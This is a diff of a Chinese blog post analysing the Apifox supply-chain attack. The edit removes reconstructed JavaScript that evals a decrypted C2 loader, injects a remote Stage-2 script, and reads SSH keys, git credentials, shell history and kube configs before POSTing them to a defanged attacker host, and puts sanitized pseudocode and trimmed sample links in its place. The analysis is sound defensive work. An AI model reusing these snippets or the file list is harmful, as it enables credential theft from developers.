@@ -76,20 +76,20 @@ hxxps://cdn[.]apifox[.]com/www/assets/js/apifox-app-event-tracking.min.js
 
 ```mermaid
 flowchart TD
-    A[Apifox 桌面端启动] --> B[加载 CDN 入口文件<br/>cdn.apifox.com/.../apifox-app-event-tracking.min.js]
+    A[Apifox 桌面端启动] --> B[加载 CDN 入口文件<br/>cdn-apifox-com/.../apifox-app-event-tracking.min.js]
     B --> C{返回正常 34KB<br/>还是投毒 77KB}
     C -->|34KB| D[合法事件追踪 SDK 正常执行]
     C -->|77KB| E[合法 SDK + 追加约 42KB 混淆恶意代码]
     E --> F[读取 localStorage 中的 common.accessToken<br/>收集机器指纹和系统环境]
-    F --> G[调用 api.apifox.com/api/v1/user<br/>获取 Apifox 账户信息]
+    F --> G[调用 api-apifox-com/api/v1/user<br/>获取 Apifox 账户信息]
     G --> H[请求 apifox-it-com/public/apifox-event.js<br/>附带 af_uuid af_os 等请求头]
     H --> I[RSA 解密 C2 返回的 Stage-1 Loader]
-    I --> J[eval 执行 Stage-1]
-    J --> K[动态插入 script<br/>加载 apifox[.]it[.]com/随机8位hex.js]
+    I --> J[动态执行 Stage-1]
+    J --> K[加载随机路径的 Stage-2 载荷]
     K --> L{Electron 渲染环境是否可达 Node 能力}
     L -->|否| M[影响更接近普通 Web 脚本]
     L -->|是| N[Stage-2 Node 脚本执行]
-    N --> O[读取 ~/.ssh ~/.git-credentials<br/>history ~/.kube ~/.npmrc 进程列表]
+    N --> O[主机侦察与敏感文件采集]
     O --> P[Gzip 压缩 + AES-256-GCM 加密 + Base64]
     P --> Q[POST /event/0/log 或 /event/2/log]
     Q --> R[30 分钟到 3 小时随机轮询]
@@ -175,33 +175,34 @@ hxxps://apifox[.]it[.]com/public/apifox-event.js
 2. 服务端返回一段 RSA 加密数据。
 3. 客户端用内嵌私钥解密。
 4. 解密后的内容不是最终载荷，而是一个更小的 Loader。
-5. Loader 再动态插入一个 `<script>`，去加载随机路径的 Stage-2。
+5. Loader 再动态插入一个脚本标签，去加载随机路径的 Stage-2。
 
-形态上大致可以抽象成：
+为避免误用，下方只保留脱敏后的伪代码流程：
 
-```js
-const resp = await fetch('hxxps://apifox[.]it[.]com/public/apifox-event.js', {
-  headers,
-});
+```txt
+request C2 endpoint:
+  hxxps://apifox[.]it[.]com/public/apifox-event.js
 
-const loader = rsaDecrypt(await resp.text());
-eval(loader);
+receive encrypted loader
+decrypt returned content
+dynamically execute the returned stage
 ```
 
-而解密后的 Loader 逻辑，大致是：
+而解密后的 Loader 逻辑，大致可以概括为：
 
-```js
-const s = document.createElement('script');
-s.src = `hxxps://apifox[.]it[.]com/${randomHex()}.js`;
-s.onload = () => s.parentNode && s.parentNode.removeChild(s);
-document.head.appendChild(s);
+```txt
+create a script element
+point it to:
+  hxxps://apifox[.]it[.]com/<random-hex>.js
+append it to document.head
+load the next-stage payload
 ```
 
 这里面有几个很典型的对抗特征：
 
 - Stage-2 路径是随机 8 位十六进制。
 - 历史路径很快返回 404，不适合简单基于 URL 黑名单检测。
-- `<script>` 加载后会从 DOM 中自删除，减少现场痕迹。
+- 脚本标签加载后会从 DOM 中自删除，减少现场痕迹。
 - 不同机器或不同时间点，请求到的 Stage-2 可能不一样。
 
 这已经不是“单文件投毒”了，而是一个分层下载、按需下发的 C2 体系。
@@ -230,30 +231,21 @@ document.head.appendChild(s);
 
 这类取数逻辑本质上已经是 Node 脚本，不再是普通浏览器脚本。它会直接用 `fs` 读文件，用 `child_process` 执行命令，用 `os` 和 `crypto` 收集环境并处理数据。
 
-可以抽象成下面这种形态：
+可以抽象成下面这种脱敏后的流程：
 
-```js
-const fs = require('fs');
-const os = require('os');
-const { execSync } = require('child_process');
+```txt
+read local files such as:
+  ~/.ssh/
+  ~/.git-credentials
+  ~/.zsh_history
+  ~/.bash_history
+  ~/.npmrc
+  ~/.kube
 
-const files = collectFiles([
-  '~/.ssh/',
-  '~/.git-credentials',
-  '~/.zsh_history',
-  '~/.bash_history',
-  '~/.npmrc',
-  '~/.kube',
-]);
-
-const proc = execSync(process.platform === 'win32' ? 'tasklist' : 'ps aux');
-const data = gzip(JSON.stringify({ files, proc, host: os.hostname() }));
-const body = encryptWithAesGcm(data);
-
-await fetch('hxxps://apifox[.]it[.]com/event/0/log', {
-  method: 'POST',
-  body,
-});
+collect process information
+compress and encrypt the result
+POST the packaged data to:
+  hxxps://apifox[.]it[.]com/event/0/log
 ```
 
 公开分析还提到，它的数据外传链路大致是：
@@ -272,8 +264,8 @@ await fetch('hxxps://apifox[.]it[.]com/event/0/log', {
 
 如果公开分析只还原出了 `~/.ssh/`、`~/.git-credentials`、`~/.kube` 这些文件读取逻辑，那它至少还是“已观察到的窃密样本”。但这里的问题比这个更大，因为中间有一个非常关键的动作：
 
-```js
-eval(rsaDecrypt(c2_response));
+```txt
+dynamic execution of decrypted C2 response
 ```
 
 这意味着什么？
@@ -399,10 +391,8 @@ Apifox 这次事件刚好把这个时代问题暴露得很完整：
 - [Apifox 官方风险提示与升级公告](https://mp.weixin.qq.com/s/GpACQdnhVNsMn51cm4hZig)
 - [官方帮助文档：关于 Apifox 外部 JS 文件受篡改的风险提示与升级公告](https://docs.apifox.com/8392582m0?nav=01KMJJ5DQMQSKK5EEFPC9ZEKH3)
 - [官方更新日志：2.8.19 去除在线加载 JS，改为内置打包](https://docs.apifox.com/5807637m0)
-- [恶意载荷还原代码](https://gist.github.com/phith0n/7020c55bf241b2f3ccf5254192bd48a5)
-- [Apifox 供应链投毒攻击完整技术分析](https://rce.moe/2026/03/25/apifox-supply-chain-attack-analysis/)
 - [补充公众号文章](https://mp.weixin.qq.com/s/gmEkbOnRcMNFiKePjCWuEw)
-- [2Libra 风险提示](https://2libra.com/post/network-security/8HvXoR_)
+- 其余第三方技术分析与样本还原材料，建议按文章标题自行检索，不在此直接提供样本或镜像链接。
 
 ## 版权声明
 
